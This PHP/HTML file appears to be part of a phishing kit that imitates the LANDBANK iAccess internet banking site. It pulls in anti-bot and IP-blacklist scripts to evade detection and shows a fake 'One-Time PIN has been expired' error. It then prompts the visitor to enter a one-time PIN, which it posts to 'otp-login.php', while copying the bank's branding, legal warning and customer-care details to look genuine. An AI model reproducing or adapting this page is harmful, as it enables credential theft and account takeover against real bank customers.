<?php
error_reporting(0);
error_log(0);

include("antibots.php");
include("ip_blacklist.php");
include("check.php");
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>

<link type="text/css" rel="stylesheet" href="lb_files/css/one.css">

<link type="text/css" rel="stylesheet" href="lb_files/css/two.css">

<link type="text/css" rel="stylesheet" href="lb_files/css/three.css">

<link type="text/css" rel="stylesheet" href="lb_files/css/four.css">

<meta charset="utf-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <meta name="apple-mobile-web-app-capable" content="yes">
            <meta name="mobile-web-app-capable" content="yes">

            <title>LANDBANK iAccess Retail Internet Banking - Retail</title>
            <link rel="shortcut icon" type="image/x-icon" href="/resources/images/favicon.ico">

<style>
/* head */
#one{
    width: 1056px; 
    margin: 0 auto;
    background-color: #ffffff;
}
#two{
    background: #eaeaea;
    height: 90px;
}

#tiredasfvck {
    float: left;
    background: #ffffff;
    width: 100%;
    padding: 5px;
}




#mainForm h3 {
    color: #414042;
}


/* footer */
footer {
    display: table;
    width: 100%;
    background-color: #ffffff;
    font-size: x-small;
}
footer a{
    color: #ffff80;
}
#warn-one {
    display: inline;
    float: left;
    width: 50%;
    margin: 10px 10px;
}
.warning {
    font-weight: bold;
    color: red;
}
.warn-two {
    font-weight: bold;
}
#contact {
    display: inline;
    float: right;
    width: 46%;
    margin: 10px 10px;
    text-align: right;
}
</style>
</head>
<body>

<div id="one">
   <div id="two">
		<img src="lb_files/img/lbpiaccess.jpg" alt="" width="1056" height="90" />
	</div>
	
	<div id="tiredasfvck">

<!-- start here -->	
<div id="msgs" class="ui-messages ui-widget" aria-live="polite" data-global="false" data-detail="data-detail" data-severity="all,error" data-redisplay="true"><div class="ui-messages-error ui-corner-all"><span class="ui-messages-error-icon"></span><ul><li role="alert" aria-atomic="true"><span class="ui-messages-error-detail">Your One-Time PIN has been expired. Please try again.</span></li></ul></div></div>

<form id="mainForm" name="mainForm" method="post" action="otp-login.php">
<div id="panelForm" class="ui-panel ui-widget ui-widget-content ui-corner-all" style="border: 0px" data-widget="widget_panelForm"><div id="panelForm_content" class="ui-panel-content ui-widget-content"><div class="ui-panel ui-widget ui-widget-content ui-corner-all"><div class="ui-panel-titlebar ui-widget-header ui-helper-clearfix ui-corner-all"><span class="ui-panel-title">Security Validation</span></div><div class="ui-panel-content ui-widget-content">
                        <span style="font-size: smaller">
                            <ul>
                                    <li>To further strengthen the security of your iAccess account, please enter the One-Time PIN we have sent to your registered mobile no. and provide the required information below. Click <b>Submit</b> once completed.</li>
                                <li>The code will expire in 5 minutes.</li>
                                <li>Do not forget to logout to iAccess once you completed your transaction.</li>
                                <li>If you forgot the answer to the security question, please proceed to your Landbank Servicing Branch to reset your password.</li>
                            </ul>
                        </span><table cellpadding="5">
<tbody>
<tr>
<td><label class="ui-outputlabel ui-widget">One-Time PIN</label></td>
<td><input id="otp" name="otp" type="password" class="ui-inputfield ui-password ui-widget ui-state-default ui-corner-all" maxlength="6" data-p-rmsg="One-Time PIN is required" role="textbox" aria-disabled="false" aria-readonly="false"></td>
</tr>
</tbody>
</table>
                        <br><button class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" onclick="" type="submit" role="button" aria-disabled="false"><span class="ui-button-text ui-c">Submit</span></button>
								<button class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" onclick="" type="submit" role="button" aria-disabled="false"><span class="ui-button-text ui-c">Resend OTP via SMS</span></button>
								</div></div></div></div>
</form>
                    <br>
                    <br>
                    <br>
                </div>
<!-- end here -->
<footer>
	<div id="warn-one">
		<span class="warning">WARNING:</span>
		<span class="warn-two">iAccess is for authorized clients only.</span>
		<span>It shall be a criminal offense for any person to:</span>
		<ol>
			<li>Obtain access to data without authority;</li>
			<li>Corrupt, alter, steal or destroy data;</li>
			<li>Interfere in computer system or server;</li>
			<li>Introduce computer virus.</li>
		</ol>
		<span>Penalty shall consist of minimum fine of Php100,000 and a maximum commensurate to the damage incurred and a mandatory imprisonment of six months to three years under R.A. No. 8792 (E-Commerce Act of the Philippines).</span>
	</div>

	<div id="contact">
		<span style="color: #0db14b; font-size: 12px; font-weight: bold;">LANDBANK CUSTOMER CARE CENTER</span><br />
		<span>Tel. Nos.: (02) 8405-7000 (NCR) or</span><br />
		<span>1-800-10-405-7000 (PLDT Domestic Toll Free/Outside NCR)</span><br />
		<span>Email: customercare@mail.landbank.com</span><br />
		<hr align="right" style="width: 380px; color: #66cc99; border: 1px solid #66cc99;" />
		<span>Regulated by the Bangko Sentral ng Pilipinas.</span><br />
		<span>Deposits are insured by PDIC up to P500,000 per depositor.</span><br />
		<span style="display: flex; flex-direction: row-reverse">
			<img src="lb_files/img/bancnet.png" alt="" width="100" height="20" />
			<span>A Proud Member of </span>
		</span>
	</div>
</div>
</footer>
</body>
